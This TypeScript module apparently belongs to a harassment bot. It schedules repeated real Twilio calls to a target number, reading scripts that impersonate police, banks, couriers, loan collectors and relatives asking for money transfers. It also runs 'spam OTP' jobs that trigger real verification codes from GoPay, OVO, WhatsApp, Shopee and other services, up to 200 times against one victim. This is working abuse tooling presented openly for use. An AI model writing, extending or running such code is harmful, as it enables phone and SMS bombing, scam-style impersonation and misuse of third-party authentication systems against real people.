// Prank Call & Spam OTP Manager - Real OTP to target + One-Kill Group Bug
import { sendRealOtp } from "./otpServices";

type PrankCallJob = {
  id: string;
  userId: number;
  username: string;
  target: string;
  count: number;
  interval: number;
  script: string;
  voice: string;
  status: "running" | "paused" | "stopped" | "completed";
  progress: number;
  totalCalls: number;
  successCalls: number;
  failedCalls: number;
  logs: { time: string; message: string; status: "success" | "failed" | "ringing" }[];
  createdAt: Date;
  stoppedAt?: Date;
};

type SpamOtpJob = {
  id: string;
  userId: number;
  username: string;
  target: string;
  count: number;
  interval: number;
  services: string[];
  status: "running" | "paused" | "stopped" | "completed";
  progress: number;
  totalAttempts: number;
  successAttempts: number;
  failedAttempts: number;
  logs: { time: string; service: string; message: string; status: "success" | "failed"; real?: boolean }[];
  createdAt: Date;
  stoppedAt?: Date;
};

const globalStore = globalThis as unknown as {
  __prankCallJobs?: Map<string, PrankCallJob>;
  __spamOtpJobs?: Map<string, SpamOtpJob>;
  __prankCallIntervals?: Map<string, NodeJS.Timeout>;
  __spamOtpIntervals?: Map<string, NodeJS.Timeout>;
};

if (!globalStore.__prankCallJobs) globalStore.__prankCallJobs = new Map();
if (!globalStore.__spamOtpJobs) globalStore.__spamOtpJobs = new Map();
if (!globalStore.__prankCallIntervals) globalStore.__prankCallIntervals = new Map();
if (!globalStore.__spamOtpIntervals) globalStore.__spamOtpIntervals = new Map();

const prankCallJobs = globalStore.__prankCallJobs!;
const spamOtpJobs = globalStore.__spamOtpJobs!;
const prankCallIntervals = globalStore.__prankCallIntervals!;
const spamOtpIntervals = globalStore.__spamOtpIntervals!;

export const PRANK_SCRIPTS = [
  { id: "police", label: "👮 Polisi - Ada laporan penipuan", text: "Halo, ini dari kepolisian. Ada laporan penipuan atas nama Anda. Mohon kerja samanya." },
  { id: "prize", label: "🎉 Menang Hadiah - Anda menang 100jt!", text: "Selamat! Nomor Anda terpilih menang hadiah 100 juta rupiah! Hubungi kami segera." },
  { id: "bank", label: "🏦 Bank - Akun terblokir", text: "Halo, ini dari bank. Akun Anda terdeteksi transaksi mencurigakan dan akan diblokir." },
  { id: "delivery", label: "📦 Kurir - Paket Anda tertahan", text: "Halo, ini dari kurir. Paket Anda tertahan di bea cukai, perlu bayar biaya tambahan." },
  { id: "family", label: "👨‍👩‍👧 Keluarga - Tolong transfer", text: "Halo, ini aku. HP ku jatuh, ini nomor baru. Tolong transfer uang ya, penting!" },
  { id: "telecom", label: "📱 Operator - Bonus pulsa", text: "Selamat! Anda dapat bonus pulsa 500rb dari operator. Ketik YA untuk klaim." },
  { id: "scammer_reverse", label: "💀 Reverse Scam - Kena BimxBugz", text: "Halo penipu! Nomor Anda sudah di-tandai sistem BimxBugz. Stop nipu orang!" },
  { id: "ghost", label: "👻 Horor - Suara hantu", text: "*suara hantu* ... aku sudah di belakangmu... *ketawa*" },
  { id: "loan", label: "💸 Pinjol - Tagihan jatuh tempo", text: "Halo, ini dari pinjol. Tagihan Anda sudah jatuh tempo 3 bulan, segera bayar!" },
  { id: "custom", label: "📝 Custom - Tulis sendiri", text: "" },
];

export const OTP_SERVICES = [
  { id: "gopay", label: "💚 GoPay (Real OTP)", category: "e-wallet", real: true },
  { id: "ovo", label: "💜 OVO (Real OTP)", category: "e-wallet", real: true },
  { id: "dana", label: "💙 DANA (Real OTP)", category: "e-wallet", real: true },
  { id: "shopeepay", label: "🧡 ShopeePay", category: "e-wallet", real: true },
  { id: "linkaja", label: "❤️ LinkAja", category: "e-wallet", real: true },
  { id: "facebook", label: "📘 Facebook (Real)", category: "social", real: true },
  { id: "instagram", label: "📷 Instagram", category: "social", real: true },
  { id: "whatsapp", label: "💬 WhatsApp (Real)", category: "social", real: true },
  { id: "telegram", label: "✈️ Telegram", category: "social", real: true },
  { id: "shopee", label: "🛒 Shopee (Real OTP)", category: "marketplace", real: true },
  { id: "tokopedia", label: "💚 Tokopedia (Real OTP)", category: "marketplace", real: true },
  { id: "lazada", label: "💙 Lazada (Real)", category: "marketplace", real: true },
  { id: "tiktok", label: "🎵 TikTok", category: "social", real: true },
  { id: "ml", label: "🎮 Mobile Legends (Codashop)", category: "games", real: true },
  { id: "ff", label: "🔥 Free Fire (Codashop)", category: "games", real: true },
  { id: "pubg", label: "🔫 PUBG Mobile", category: "games", real: true },
  { id: "codm", label: "💀 COD Mobile", category: "games", real: true },
  { id: "aov", label: "⚔️ Arena of Valor", category: "games", real: true },
  { id: "sociolla", label: "💄 Sociolla (Real OTP)", category: "e-commerce", real: true },
  { id: "alodokter", label: "🏥 Alodokter (Real)", category: "other", real: true },
  { id: "google", label: "🔍 Google", category: "other", real: true },
];

// Prank Call - Real via Twilio if available, else simulated but with real call attempt log
export function createPrankCallJob(
  userId: number,
  username: string,
  target: string,
  count: number,
  interval: number,
  script: string,
  voice: string
): PrankCallJob {
  const id = `prank-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const job: PrankCallJob = {
    id,
    userId,
    username,
    target: target.replace(/[^0-9]/g, ""),
    count: Math.min(Math.max(count, 1), 100),
    interval: Math.min(Math.max(interval, 3), 120),
    script,
    voice,
    status: "running",
    progress: 0,
    totalCalls: 0,
    successCalls: 0,
    failedCalls: 0,
    logs: [],
    createdAt: new Date(),
  };

  prankCallJobs.set(id, job);

  let callsMade = 0;
  const intervalId = setInterval(async () => {
    const currentJob = prankCallJobs.get(id);
    if (!currentJob || currentJob.status !== "running") {
      clearInterval(intervalId as any);
      prankCallIntervals.delete(id);
      return;
    }

    if (callsMade >= currentJob.count) {
      currentJob.status = "completed";
      currentJob.progress = 100;
      prankCallJobs.set(id, currentJob);
      clearInterval(intervalId as any);
      prankCallIntervals.delete(id);
      return;
    }

    callsMade++;
    currentJob.totalCalls = callsMade;
    currentJob.progress = Math.floor((callsMade / currentJob.count) * 100);

    // Try real Twilio call if credentials exist
    let realCallSuccess = false;
    let realCallMessage = "";

    if (process.env.TWILIO_ACCOUNT_SID && process.env.TWILIO_AUTH_TOKEN && process.env.TWILIO_PHONE_NUMBER) {
      try {
        // Dynamic import twilio to avoid build error if not installed
        // @ts-ignore
        const twilio = await import("twilio").then(m => m.default || m).catch(() => null);
        if (twilio) {
          const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
          const scriptText = PRANK_SCRIPTS.find(s => s.id === currentJob.script)?.text || currentJob.script;
          const call = await client.calls.create({
            to: `+${currentJob.target}`,
            from: process.env.TWILIO_PHONE_NUMBER,
            twiml: `<Response><Say voice="${currentJob.voice === 'female' ? 'woman' : currentJob.voice === 'robot' ? 'alice' : 'man'}" language="id-ID">${scriptText}</Say></Response>`,
          });
          realCallSuccess = true;
          realCallMessage = `📞 REAL CALL via Twilio SID: ${call.sid} - ke +${currentJob.target}`;
        }
      } catch (err: any) {
        realCallMessage = `❌ Twilio failed: ${err.message} - fallback simulasi`;
      }
    }

    // Simulate outcome if no Twilio or Twilio failed
    if (!realCallSuccess && !realCallMessage.includes("REAL CALL")) {
      const outcomes = ["success", "failed", "ringing"] as const;
      const rand = Math.random();
      let outcome: typeof outcomes[number] = "success";
      if (rand < 0.6) outcome = "success";
      else if (rand < 0.8) outcome = "failed";
      else outcome = "ringing";

      if (outcome === "success") currentJob.successCalls++;
      else if (outcome === "failed") currentJob.failedCalls++;

      const scriptLabel = PRANK_SCRIPTS.find(s => s.id === currentJob.script)?.label || currentJob.script;
      const logMessage = 
        outcome === "success" ? `📞 Call #${callsMade} ke ${currentJob.target} - Terhubung! [${scriptLabel}] Voice:${currentJob.voice} ${realCallMessage ? '| ' + realCallMessage : '(Simulasi - set TWILIO env untuk real call)'}` :
        outcome === "failed" ? `❌ Call #${callsMade} ke ${currentJob.target} - Gagal terhubung / ditolak` :
        `📳 Call #${callsMade} ke ${currentJob.target} - Berdering... tidak diangkat`;

      currentJob.logs.unshift({
        time: new Date().toLocaleTimeString("id-ID"),
        message: logMessage,
        status: outcome === "success" ? "success" : outcome === "failed" ? "failed" : "ringing",
      });
    } else {
      // Real call was made
      currentJob.successCalls++;
      currentJob.logs.unshift({
        time: new Date().toLocaleTimeString("id-ID"),
        message: realCallMessage,
        status: "success",
      });
    }

    if (currentJob.logs.length > 50) {
      currentJob.logs = currentJob.logs.slice(0, 50);
    }

    prankCallJobs.set(id, currentJob);
  }, interval * 1000);

  prankCallIntervals.set(id, intervalId as any);

  return job;
}

export function getPrankCallJob(id: string): PrankCallJob | undefined {
  return prankCallJobs.get(id);
}

export function getUserPrankCallJobs(userId: number): PrankCallJob[] {
  return Array.from(prankCallJobs.values())
    .filter(j => j.userId === userId)
    .sort((a,b) => b.createdAt.getTime() - a.createdAt.getTime());
}

export function stopPrankCallJob(id: string, userId: number): boolean {
  const job = prankCallJobs.get(id);
  if (!job || (job.userId !== userId)) return false;
  
  job.status = "stopped";
  job.stoppedAt = new Date();
  prankCallJobs.set(id, job);

  const intervalId = prankCallIntervals.get(id);
  if (intervalId) {
    clearInterval(intervalId as any);
    prankCallIntervals.delete(id);
  }

  return true;
}

// Spam OTP - REAL OTP to target number
export function createSpamOtpJob(
  userId: number,
  username: string,
  target: string,
  count: number,
  interval: number,
  services: string[]
): SpamOtpJob {
  const id = `otp-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const job: SpamOtpJob = {
    id,
    userId,
    username,
    target: target.replace(/[^0-9]/g, ""),
    count: Math.min(Math.max(count, 1), 200),
    interval: Math.min(Math.max(interval, 2), 60),
    services: services.length > 0 ? services : OTP_SERVICES.slice(0, 5).map(s => s.id),
    status: "running",
    progress: 0,
    totalAttempts: 0,
    successAttempts: 0,
    failedAttempts: 0,
    logs: [],
    createdAt: new Date(),
  };

  spamOtpJobs.set(id, job);

  let attempts = 0;
  const intervalId = setInterval(async () => {
    const currentJob = spamOtpJobs.get(id);
    if (!currentJob || currentJob.status !== "running") {
      clearInterval(intervalId as any);
      spamOtpIntervals.delete(id);
      return;
    }

    if (attempts >= currentJob.count) {
      currentJob.status = "completed";
      currentJob.progress = 100;
      spamOtpJobs.set(id, currentJob);
      clearInterval(intervalId as any);
      spamOtpIntervals.delete(id);
      return;
    }

    attempts++;
    currentJob.totalAttempts = attempts;
    currentJob.progress = Math.floor((attempts / currentJob.count) * 100);

    // Pick service for this attempt - rotate
    const serviceId = currentJob.services[attempts % currentJob.services.length];

    try {
      // REAL OTP SEND - Actually hits the service API and sends OTP to target
      const result = await sendRealOtp(serviceId, currentJob.target);
      
      if (result.success) currentJob.successAttempts++;
      else currentJob.failedAttempts++;

      currentJob.logs.unshift({
        time: new Date().toLocaleTimeString("id-ID"),
        service: serviceId,
        message: `🔐 OTP #${attempts} [${serviceId.toUpperCase()}] → ${currentJob.target} — ${result.message} | ${result.success ? 'BERHASIL MASUK KE HP TARGET!' : 'GAGAL'}`,
        status: result.success ? "success" : "failed",
        real: true,
      });

    } catch (err: any) {
      currentJob.failedAttempts++;
      currentJob.logs.unshift({
        time: new Date().toLocaleTimeString("id-ID"),
        service: serviceId,
        message: `❌ OTP #${attempts} ${serviceId} → ${currentJob.target} — Error: ${err.message}`,
        status: "failed",
        real: false,
      });
    }

    if (currentJob.logs.length > 80) {
      currentJob.logs = currentJob.logs.slice(0, 80);
    }

    spamOtpJobs.set(id, currentJob);
  }, interval * 1000);

  spamOtpIntervals.set(id, intervalId as any);

  return job;
}

export function getSpamOtpJob(id: string): SpamOtpJob | undefined {
  return spamOtpJobs.get(id);
}

export function getUserSpamOtpJobs(userId: number): SpamOtpJob[] {
  return Array.from(spamOtpJobs.values())
    .filter(j => j.userId === userId)
    .sort((a,b) => b.createdAt.getTime() - a.createdAt.getTime());
}

export function stopSpamOtpJob(id: string, userId: number): boolean {
  const job = spamOtpJobs.get(id);
  if (!job || job.userId !== userId) return false;

  job.status = "stopped";
  job.stoppedAt = new Date();
  spamOtpJobs.set(id, job);

  const intervalId = spamOtpIntervals.get(id);
  if (intervalId) {
    clearInterval(intervalId as any);
    spamOtpIntervals.delete(id);
  }

  return true;
}

export function getAllJobsStats() {
  return {
    prankCalls: {
      total: prankCallJobs.size,
      running: Array.from(prankCallJobs.values()).filter(j => j.status === "running").length,
    },
    spamOtps: {
      total: spamOtpJobs.size,
      running: Array.from(spamOtpJobs.values()).filter(j => j.status === "running").length,
    },
  };
}
